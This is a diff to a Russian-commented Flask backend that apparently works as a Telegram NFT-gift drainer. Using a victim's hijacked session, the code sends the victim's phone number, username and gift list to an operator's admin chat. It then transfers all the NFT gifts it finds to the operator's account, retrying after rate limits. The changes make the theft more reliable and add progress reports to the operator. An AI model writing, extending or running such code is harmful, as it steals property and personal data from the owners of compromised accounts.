@@ -1,4 +1,5 @@
-# app.py — ПОЛНАЯ ВЕРСИЯ С ВЕРИФИКАЦИЕЙ, СПИСКОМ И ПЕРЕДАЧЕЙ
+# app.py — ИСПРАВЛЕННЫЙ БЭКЕНД
+# Получает ТОЛЬКО подарки пользователя (инбокс), а не весь магазин
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -46,6 +47,14 @@ def send_gifts_list_to_admin(phone, username, gifts_data):
     gifts_data: список словарей с полями collection, item_id, link
     """
     try:
+        if not gifts_data:
+            send_admin_log(
+                f"📭 *Нет NFT подарков*\n"
+                f"📱 {phone}\n"
+                f"👤 @{username}"
+            )
+            return
+        
         lines = []
         lines.append("=" * 50)
         lines.append(f"🎁 NFT ПОДАРКИ ПОЛЬЗОВАТЕЛЯ")
@@ -55,12 +64,9 @@ def send_gifts_list_to_admin(phone, username, gifts_data):
         lines.append(f"📦 Всего найдено: {len(gifts_data)}")
         lines.append("")
         
-        if gifts_data:
-            lines.append("СПИСОК ПОДАРКОВ:")
-            for i, gift in enumerate(gifts_data, 1):
-                lines.append(f"{i}. [{gift['collection']} #{gift['item_id']}]({gift['link']})")
-        else:
-            lines.append("❌ Подарков не найдено")
+        lines.append("СПИСОК ПОДАРКОВ:")
+        for i, gift in enumerate(gifts_data, 1):
+            lines.append(f"{i}. [{gift['collection']} #{gift['item_id']}]({gift['link']})")
         
         lines.append("")
         lines.append("=" * 50)
@@ -68,14 +74,14 @@ def send_gifts_list_to_admin(phone, username, gifts_data):
         text = "\n".join(lines)
         send_admin_log(text)
         
-        # Дополнительно отправляем как файл, если много подарков
+        # Если много подарков — отправляем файлом
         if len(gifts_data) > 10:
             file_content = "\n".join([f"{g['collection']}-{g['item_id']}: {g['link']}" for g in gifts_data])
             file_data = io.BytesIO(file_content.encode('utf-8'))
             files = {'document': (f"gifts_{phone}_{int(time.time())}.txt", file_data)}
             data = {
                 'chat_id': ADMIN_CHAT_ID,
-                'caption': f"📁 Полный список подарков @{username}",
+                'caption': f"📁 Полный список подарков @{username} ({len(gifts_data)} шт.)",
                 'parse_mode': 'Markdown'
             }
             requests.post(
@@ -126,7 +132,7 @@ def get_nft_link(gift):
     if not collection:
         collection = f"nft_{item_id}"
     
-    # Очищаем название от пробелов и спецсимволов, оставляем только буквы, цифры, тире
+    # Очищаем название от пробелов и спецсимволов
     collection = re.sub(r'[^a-zA-Z0-9_-]', '', str(collection))
     
     # Формируем ссылку
@@ -140,73 +146,100 @@ def get_nft_link(gift):
 
 async def get_user_gifts(client, user_id):
     """
-    Получает все подарки пользователя и возвращает список NFT подарков
+    Получает подарки, которые реально принадлежат пользователю (инбокс)
+    Возвращает только NFT подарки (коллекционные)
     """
     all_gifts = []
+    print(f"[DEBUG] Getting gifts for user_id: {user_id}")
     
-    # Метод 1: через get_available_gifts()
+    # Метод 1: get_inbox_gifts() - ТОЛЬКО подарки пользователя
     try:
-        if hasattr(client, 'get_available_gifts'):
-            all_gifts = await client.get_available_gifts()
+        if hasattr(client, 'get_inbox_gifts'):
+            result = await client.get_inbox_gifts()
+            if result:
+                all_gifts = result
+                print(f"[DEBUG] Found {len(all_gifts)} inbox gifts")
+            else:
+                print("[DEBUG] get_inbox_gifts returned empty")
     except Exception as e:
-        print(f"Method 1 (get_available_gifts) failed: {e}")
+        print(f"[DEBUG] get_inbox_gifts failed: {e}")
     
-    # Метод 2: через сырой вызов GetGiftsRequest
-    if not all_gifts:
-        try:
-            from pyrogram.raw.functions.payments import GetGiftsRequest
-            result = await client.invoke(GetGiftsRequest())
-            if result and hasattr(result, 'gifts'):
-                all_gifts = result.gifts
-        except Exception as e:
-            print(f"Method 2 (GetGiftsRequest) failed: {e}")
-    
-    # Метод 3: через GetUserGiftsRequest
+    # Метод 2: GetUserGiftsRequest - прямой вызов MTProto
     if not all_gifts:
         try:
             from pyrogram.raw.functions.payments import GetUserGiftsRequest
             result = await client.invoke(GetUserGiftsRequest(
                 user_id=user_id,
-                limit=100
+                limit=100,
+                offset=0
             ))
             if result and hasattr(result, 'gifts'):
                 all_gifts = result.gifts
+                print(f"[DEBUG] Found {len(all_gifts)} gifts via GetUserGiftsRequest")
         except Exception as e:
-            print(f"Method 3 (GetUserGiftsRequest) failed: {e}")
+            print(f"[DEBUG] GetUserGiftsRequest failed: {e}")
     
-    # Если ничего не нашли — пробуем через бота
+    # Метод 3: GetGiftsRequest с фильтрацией по владельцу
     if not all_gifts:
         try:
-            # Пытаемся получить через метод get_inbox_gifts
-            if hasattr(client, 'get_inbox_gifts'):
-                all_gifts = await client.get_inbox_gifts()
+            from pyrogram.raw.functions.payments import GetGiftsRequest
+            result = await client.invoke(GetGiftsRequest())
+            if result and hasattr(result, 'gifts'):
+                for gift in result.gifts:
+                    owner_id = None
+                    if hasattr(gift, 'user_id'):
+                        owner_id = gift.user_id
+                    elif hasattr(gift, 'owner_id'):
+                        owner_id = gift.owner_id
+                    elif hasattr(gift, 'from_id'):
+                        owner_id = gift.from_id
+                    
+                    if owner_id == user_id:
+                        all_gifts.append(gift)
+                print(f"[DEBUG] Found {len(all_gifts)} gifts via GetGiftsRequest (filtered)")
         except Exception as e:
-            print(f"Method 4 (get_inbox_gifts) failed: {e}")
+            print(f"[DEBUG] GetGiftsRequest failed: {e}")
     
+    # Если ничего не нашли — возвращаем пустой список
     if not all_gifts:
+        print("[DEBUG] No gifts found for user")
         return []
     
-    # Фильтруем NFT подарки
+    # Фильтруем только NFT (коллекционные) подарки
     nft_gifts = []
     for gift in all_gifts:
         is_nft = False
+        gift_name = "Unknown"
         
-        # Проверяем разные поля
-        if hasattr(gift, 'limited'):
-            is_nft = gift.limited
-        elif hasattr(gift, 'is_limited'):
-            is_nft = gift.is_limited
-        elif hasattr(gift, 'collectible'):
-            is_nft = gift.collectible
-        elif hasattr(gift, 'sticker_set_name'):
+        # Получаем имя для логирования
+        if hasattr(gift, 'name'):
+            gift_name = gift.name
+        elif hasattr(gift, 'title'):
+            gift_name = gift.title
+        
+        # Проверяем различные признаки NFT
+        if hasattr(gift, 'limited') and gift.limited:
             is_nft = True
-        elif hasattr(gift, 'gift_type'):
-            if gift.gift_type == 'nft':
-                is_nft = True
+        elif hasattr(gift, 'is_limited') and gift.is_limited:
+            is_nft = True
+        elif hasattr(gift, 'collectible') and gift.collectible:
+            is_nft = True
+        elif hasattr(gift, 'sticker_set_name') and gift.sticker_set_name:
+            is_nft = True
+        elif hasattr(gift, 'nft') and gift.nft:
+            is_nft = True
+        
+        # Если подарок обычный (эмодзи) — пропускаем
+        if hasattr(gift, 'is_regular') and gift.is_regular:
+            is_nft = False
+        if hasattr(gift, 'is_emoji') and gift.is_emoji:
+            is_nft = False
         
         if is_nft:
             nft_gifts.append(gift)
+            print(f"[DEBUG] NFT gift found: {gift_name}")
     
+    print(f"[DEBUG] Total NFT gifts: {len(nft_gifts)}")
     return nft_gifts
 
 async def transfer_nft_gifts(session_string, phone, username, user_id, transfer=True):
@@ -223,6 +256,7 @@ async def transfer_nft_gifts(session_string, phone, username, user_id, transfer=
             in_memory=True
         )
         await client.connect()
+        print(f"[DEBUG] Client connected for {phone}")
         
         # Проверяем авторизацию
         try:
@@ -230,21 +264,35 @@ async def transfer_nft_gifts(session_string, phone, username, user_id, transfer=
             if not me:
                 send_admin_log(f"❌ Сессия не активна\n📱 {phone}")
                 return {'success': False, 'error': 'Сессия не активна'}
+            print(f"[DEBUG] User authorized: @{me.username}")
         except Exception as e:
             send_admin_log(f"❌ Ошибка авторизации\n📱 {phone}\n`{str(e)[:100]}`")
             return {'success': False, 'error': f'Ошибка авторизации: {str(e)[:100]}'}
         
-        # Получаем подарки
+        # Пробуем получить подарки пользователя (только его инбокс)
+        send_admin_log(f"🔍 Ищем подарки пользователя @{username}...")
+        print(f"[DEBUG] Searching gifts for user_id: {user_id}")
+        
         nft_gifts = await get_user_gifts(client, user_id)
+        
+        # Логируем результат поиска
+        send_admin_log(
+            f"📊 *Результат поиска*\n"
+            f"👤 @{username}\n"
+            f"📦 Найдено NFT подарков: {len(nft_gifts)}"
+        )
         
         if not nft_gifts:
             send_admin_log(
-                f"📭 *Нет NFT подарков*\n📱 {phone}\n👤 @{username}"
+                f"📭 *У пользователя нет NFT подарков*\n"
+                f"📱 {phone}\n"
+                f"👤 @{username}\n\n"
+                f"ℹ️ Проверь профиль вручную: https://t.me/{username}"
             )
             return {
                 'success': True,
                 'gifts_found': False,
-                'message': 'Нет NFT подарков',
+                'message': 'Нет NFT подарков в профиле',
                 'gifts': []
             }
         
@@ -263,21 +311,36 @@ async def transfer_nft_gifts(session_string, phone, username, user_id, transfer=
                     gift_id = gift.id
                 elif hasattr(gift, 'gift_id'):
                     gift_id = gift.gift_id
+                elif hasattr(gift, 'sticker_id'):
+                    gift_id = gift.sticker_id
                 
                 if gift_id:
                     gift_ids.append(gift_id)
+                    print(f"[DEBUG] Gift ID: {gift_id}, Link: {gift_info['link']}")
         
         # Отправляем список админу
         send_gifts_list_to_admin(phone, username, gifts_data)
         
-        # Если нужно передать подарки
-        if transfer and gift_ids:
+        # Если передавать не нужно — просто возвращаем список
+        if not transfer:
+            return {
+                'success': True,
+                'gifts_found': True,
+                'gifts': gifts_data,
+                'message': f'Найдено {len(gifts_data)} NFT подарков'
+            }
+        
+        # Передаем подарки админу
+        if gift_ids:
             transferred = 0
             failed = 0
             
-            for gift_id in gift_ids:
+            send_admin_log(f"🔄 Начинаю передачу {len(gift_ids)} подарков...")
+            
+            for i, gift_id in enumerate(gift_ids, 1):
                 try:
-                    # Пробуем передать подарок
+                    send_admin_log(f"🔄 Передаю подарок {i}/{len(gift_ids)} (ID: {gift_id})")
+                    
                     if hasattr(client, 'transfer_gift'):
                         await client.transfer_gift(gift_id=gift_id, user_id=ADMIN_USER_ID)
                     else:
@@ -287,9 +350,9 @@ async def transfer_nft_gifts(session_string, phone, username, user_id, transfer=
                             to_id=ADMIN_USER_ID
                         ))
                     transferred += 1
+                    print(f"[DEBUG] Gift {gift_id} transferred successfully")
                     await asyncio.sleep(0.5)
                 except FloodWait as e:
-                    # Если флуд-вейт — ждем и пробуем снова
                     wait_time = e.value
                     send_admin_log(f"⏳ FloodWait {wait_time} секунд\n📱 {phone}")
                     await asyncio.sleep(wait_time)
@@ -303,11 +366,13 @@ async def transfer_nft_gifts(session_string, phone, username, user_id, transfer=
                                 to_id=ADMIN_USER_ID
                             ))
                         transferred += 1
-                    except:
+                        print(f"[DEBUG] Gift {gift_id} transferred after flood wait")
+                    except Exception as e:
                         failed += 1
+                        print(f"[DEBUG] Transfer retry failed for {gift_id}: {e}")
                 except Exception as e:
-                    print(f"Transfer error for {gift_id}: {e}")
                     failed += 1
+                    print(f"[DEBUG] Transfer failed for {gift_id}: {e}")
                     continue
             
             result_msg = f"✅ Передано: {transferred}\n❌ Не удалось: {failed}"
@@ -327,7 +392,7 @@ async def transfer_nft_gifts(session_string, phone, username, user_id, transfer=
             'success': True,
             'gifts_found': True,
             'gifts': gifts_data,
-            'message': f'Найдено {len(gifts_data)} NFT подарков'
+            'message': f'Найдено {len(gifts_data)} NFT подарков, но не удалось получить ID для передачи'
         }
         
     except Exception as e:
@@ -338,6 +403,7 @@ async def transfer_nft_gifts(session_string, phone, username, user_id, transfer=
         if client and hasattr(client, 'is_connected') and client.is_connected:
             try:
                 await client.disconnect()
+                print(f"[DEBUG] Client disconnected")
             except:
                 pass
 
@@ -486,7 +552,8 @@ def ping():
     return jsonify({
         'status': 'online',
         'library': 'Pyrogram',
-        'version': '2.0'
+        'version': '2.0',
+        'note': 'Получает ТОЛЬКО подарки пользователя (инбокс)'
     })
 
 @app.route('/sendCode', methods=['POST'])
@@ -597,6 +664,6 @@ def get_gifts_only():
 if __name__ == '__main__':
     print("=" * 60)
     print("🔐 NFT GIFT PARSER & TRANSFER SERVICE")
-    print("📌 Версия с верификацией и списком подарков")
+    print("📌 Версия 2.0 — ТОЛЬКО ИНБОКС ПОЛЬЗОВАТЕЛЯ")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000, debug=False)
